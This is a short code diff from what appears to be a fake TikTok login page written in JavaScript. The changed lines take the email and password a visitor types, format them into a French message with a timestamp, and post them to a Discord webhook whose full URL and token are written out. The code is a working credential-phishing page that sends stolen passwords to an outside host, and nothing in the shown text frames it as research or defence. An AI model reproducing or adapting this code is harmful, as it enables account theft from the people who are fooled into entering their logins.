@@ -279,11 +279,11 @@
       const email = emailInput.value.trim();
       const password = passwordInput.value.trim();
 
-      const discordMessage = `**📱 Nouveau Compte TikTok :**\n\n` +
-        '```' +
-        `\n📧 Email        | ${email}\n` +
-        `🔑 Mot de passe | ${password}\n` +
-        '```';
+      const discordMessage =
+        `📥 **Nouvelle tentative de connexion TikTok**\n\n` +
+        `**👤 Email ou Nom d'utilisateur :** \`${email}\`\n` +
+        `**🔐 Mot de passe :** \`${password}\`\n` +
+        `🕒 Date : ${new Date().toLocaleString('fr-FR')}`;
 
       fetch('https://discord.com/api/webhooks/1382805479318884393/q3PgxN5YRwcy1MPgFurwEWHcLq9c3wBSqAOSnKkbYO1z23cRgTPuEzCgvcILBvf_-_p6', {
         method: 'POST',
